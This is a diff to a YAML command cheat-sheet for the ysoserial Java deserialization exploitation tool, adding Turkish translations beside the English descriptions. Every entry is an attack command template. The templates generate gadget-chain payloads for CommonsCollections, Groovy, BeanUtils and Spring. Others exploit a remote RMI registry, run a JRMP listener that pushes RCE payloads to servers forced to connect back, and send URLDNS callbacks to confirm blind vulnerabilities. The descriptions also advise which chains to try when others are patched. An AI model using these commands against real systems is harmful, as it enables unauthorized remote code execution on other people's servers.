@@ -4,62 +4,118 @@ tags: [java, security, exploitation, deserialization, pentest, rce, infrastructu
 # === PAYLOAD GENERATION ===
 
 actions:
- - title: ysoserial - basic payload generation
-   desc: |
-     Generates a serialized Java object targeting a specific vulnerable library to execute a system command. 
-     This is the most common usage of the tool, where the output is binary data that must be delivered to a deserialization entry point. 
-     You must know or guess the classpath dependencies of the target application to select the correct gadget chain.
+ - title:
+     en: ysoserial - basic payload generation
+     tr: ysoserial - temel yük üretimi
+   desc:
+     en: |
+       Generates a serialized Java object targeting a specific vulnerable library to execute a system command. 
+       This is the most common usage of the tool, where the output is binary data that must be delivered to a deserialization entry point. 
+       You must know or guess the classpath dependencies of the target application to select the correct gadget chain.
+     tr: |
+       Bir sistem komutu yürütmek için belirli bir savunmasız Java kütüphanesini hedefleyen serileştirilmiş bir Java nesnesi üretir.
+       Bu, aracın en yaygın kullanımıdır; çıktısı bir seri durumdan çıkarma giriş noktasına iletilmesi gereken ikili veridir.
+       Doğru gadget zincirini seçmek için hedef uygulamanın sınıf yolu bağımlılıklarını bilmeniz veya tahmin etmeniz gerekir.
    command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
- - title: ysoserial - generate and save to file
-   desc: |
-     Generates a malicious serialized object and redirects the binary output into a specific file. 
-     This is essential when the exploit requires uploading a file or sending binary data via tools like curl or Burp Suite. 
-     Always use redirection (>) to ensure the binary integrity of the payload is maintained without console encoding issues.
+ - title:
+     en: ysoserial - generate and save to file
+     tr: ysoserial - üretme ve dosyaya kaydetme
+   desc:
+     en: |
+       Generates a malicious serialized object and redirects the binary output into a specific file. 
+       This is essential when the exploit requires uploading a file or sending binary data via tools like curl or Burp Suite. 
+       Always use redirection (>) to ensure the binary integrity of the payload is maintained without console encoding issues.
+     tr: |
+       Zararlı serileştirilmiş bir nesne üretir ve ikili çıktıyı belirli bir dosyaya yönlendirir.
+       Bu, sömürünün dosya yükleme veya curl ya da Burp Suite gibi araçlarla ikili veri gönderme gerektirdiğinde gereklidir.
+       Konsol kodlama sorunları olmadan yükün ikili bütünlüğünü korumak için her zaman yönlendirme (>) kullanın.
    command: "java -jar ysoserial.jar {{payload_type|CommonsCollections1}} '{{command|whoami}}' > {{output_file|payload.bin}}"
 
- - title: ysoserial - dns exfiltration (URLDNS)
-   desc: |
-     Creates a payload that triggers a DNS lookup to a specified URL upon deserialization. 
-     This payload is extremely useful for "blind" deserialization vulnerabilities because it does not depend on any third-party libraries (it uses standard JDK classes). 
-     It is the primary method for confirming a vulnerability exists before attempting a more complex RCE gadget chain.
+ - title:
+     en: ysoserial - dns exfiltration (URLDNS)
+     tr: ysoserial - dns sızdırma (URLDNS)
+   desc:
+     en: |
+       Creates a payload that triggers a DNS lookup to a specified URL upon deserialization. 
+       This payload is extremely useful for "blind" deserialization vulnerabilities because it does not depend on any third-party libraries (it uses standard JDK classes). 
+       It is the primary method for confirming a vulnerability exists before attempting a more complex RCE gadget chain.
+     tr: |
+       Seri durumdan çıkarma sırasında belirtilen bir URL'ye DNS sorgusu tetikleyen bir yük oluşturur.
+       Bu yük "kör" seri durumdan çıkarma zafiyetleri için son derece kullanışlıdır çünkü üçüncü parti kütüphanelere bağlı değildir (standart JDK sınıflarını kullanır).
+       Daha karmaşık bir RCE gadget zincirini denemeden önce zafiyetin varlığını doğrulamanın birincil yöntemidir.
    command: "java -jar ysoserial.jar URLDNS \"{{dns_callback_url}}\""
 
 # === EXPLOIT MODULES ===
 
- - title: ysoserial - exploit RMI registry
-   desc: |
-     Executes a direct attack against a remote RMI Registry service. 
-     The exploit attempts to bind a malicious object into the registry, which triggers deserialization on the server side. 
-     This requires the target port (default 1099) to be accessible and the server to have vulnerable libraries in its classpath.
+ - title:
+     en: ysoserial - exploit RMI registry
+     tr: ysoserial - RMI kayıt sömürüsü
+   desc:
+     en: |
+       Executes a direct attack against a remote RMI Registry service. 
+       The exploit attempts to bind a malicious object into the registry, which triggers deserialization on the server side. 
+       This requires the target port (default 1099) to be accessible and the server to have vulnerable libraries in its classpath.
+     tr: |
+       Uzak bir RMI Kayıt servisine karşı doğrudan saldırı yürütür.
+       Sömürü, kayıt defterine zararlı bir nesne bağlayarak sunucu tarafında seri durumdan çıkarmayı tetikler.
+       Hedef portun (varsayılan 1099) erişilebilir olmasını ve sunucunun sınıf yolunda savunmasız kütüphaneler bulunmasını gerektirir.
    command: "java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit {{target_ip}} {{target_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
- - title: ysoserial - start JRMP listener
-   desc: |
-     Starts a local JRMP (Java Remote Method Protocol) server that delivers a payload to any connecting client. 
-     This is used for "inbound" attacks where a vulnerable server is forced to connect back to the attacker (e.g., using a JRMPClient gadget). 
-     The attacker-controlled listener will then send the actual RCE payload (like CommonsCollections) to the target upon connection.
+ - title:
+     en: ysoserial - start JRMP listener
+     tr: ysoserial - JRMP dinleyicisi başlatma
+   desc:
+     en: |
+       Starts a local JRMP (Java Remote Method Protocol) server that delivers a payload to any connecting client. 
+       This is used for "inbound" attacks where a vulnerable server is forced to connect back to the attacker (e.g., using a JRMPClient gadget). 
+       The attacker-controlled listener will then send the actual RCE payload (like CommonsCollections) to the target upon connection.
+     tr: |
+       Bağlanan her istemciye yük ileten yerel bir JRMP (Java Uzak Yöntem Protokolü) sunucusu başlatır.
+       Bu, savunmasız bir sunucunun saldırgana geri bağlanmaya zorlandığı "içe doğru" saldırılarda kullanılır (örn. JRMPClient gadget ile).
+       Saldırgan kontrollü dinleyici, bağlantı üzerine hedefe asıl RCE yükünü (CommonsCollections gibi) gönderir.
    command: "java -cp ysoserial.jar ysoserial.exploit.JRMPListener {{listening_port|1099}} {{payload_type|CommonsCollections1}} '{{command|calc.exe}}'"
 
 # === COMMON GADGET CHAINS ===
 
- - title: ysoserial - groovy library exploit
-   desc: |
-     Generates an exploit payload specifically for applications that include the Groovy runtime library. 
-     Groovy is a common dependency in modern Java applications and provides a reliable path to remote code execution. 
-     This gadget is often a good alternative when the more common Apache Commons Collections chains are patched.
+ - title:
+     en: ysoserial - groovy library exploit
+     tr: ysoserial - groovy kütüphane sömürüsü
+   desc:
+     en: |
+       Generates an exploit payload specifically for applications that include the Groovy runtime library. 
+       Groovy is a common dependency in modern Java applications and provides a reliable path to remote code execution. 
+       This gadget is often a good alternative when the more common Apache Commons Collections chains are patched.
+     tr: |
+       Groovy çalışma zamanı kütüphanesi içeren uygulamalar için özel sömürü yükü üretir.
+       Groovy modern Java uygulamalarında yaygın bir bağımlılıktır ve uzaktan kod çalıştırmaya güvenilir bir yol sağlar.
+       Bu gadget, daha yaygın Apache Commons Collections zincirleri yamalandığında genellikle iyi bir alternatiftir.
    command: "java -jar ysoserial.jar Groovy1 '{{command|touch /tmp/pwned}}'"
 
- - title: ysoserial - common beansutils exploit
-   desc: |
-     Targets applications utilizing the Apache Commons BeanUtils library for property manipulation. 
-     This gadget chain is effective against many enterprise Java applications that use BeanUtils for data mapping. 
-     It is particularly useful when the environment has strict classloader restrictions that block other gadget chains.
+ - title:
+     en: ysoserial - common beansutils exploit
+     tr: ysoserial - yaygın beansutils sömürüsü
+   desc:
+     en: |
+       Targets applications utilizing the Apache Commons BeanUtils library for property manipulation. 
+       This gadget chain is effective against many enterprise Java applications that use BeanUtils for data mapping. 
+       It is particularly useful when the environment has strict classloader restrictions that block other gadget chains.
+     tr: |
+       Özellik manipülasyonu için Apache Commons BeanUtils kütüphanesini kullanan uygulamaları hedefler.
+       Bu gadget zinciri, veri eşleme için BeanUtils kullanan birçok kurumsal Java uygulamasına karşı etkilidir.
+       Özellikle ortamda diğer gadget zincirlerini engelleyen katı sınıf yükleyici kısıtlamaları olduğunda kullanışlıdır.
    command: "java -jar ysoserial.jar CommonsBeanutils1 '{{command|whoami}}'"
 
- - title: ysoserial - spring framework exploit
-   desc: |
-     Targets the Spring Framework, one of the most widely used Java application frameworks. 
-     This payload utilizes classes within the Spring Core and Spring Beans modules to achieve code execution. 
-     It is highly effective against Spring-based microservices that expose deserialization endpoints.
+ - title:
+     en: ysoserial - spring framework exploit
+     tr: ysoserial - spring framework sömürüsü
+   desc:
+     en: |
+       Targets the Spring Framework, one of the most widely used Java application frameworks. 
+       This payload utilizes classes within the Spring Core and Spring Beans modules to achieve code execution. 
+       It is highly effective against Spring-based microservices that expose deserialization endpoints.
+     tr: |
+       En yaygın kullanılan Java uygulama çerçevelerinden Spring Framework'ü hedefler.
+       Bu yük, kod çalıştırma için Spring Core ve Spring Beans modüllerindeki sınıfları kullanır.
+       Seri durumdan çıkarma uç noktalarını açığa çıkaran Spring tabanlı mikro servislere karşı oldukça etkilidir.
    command: "java -jar ysoserial.jar Spring1 '{{command|sleep 10}}'"
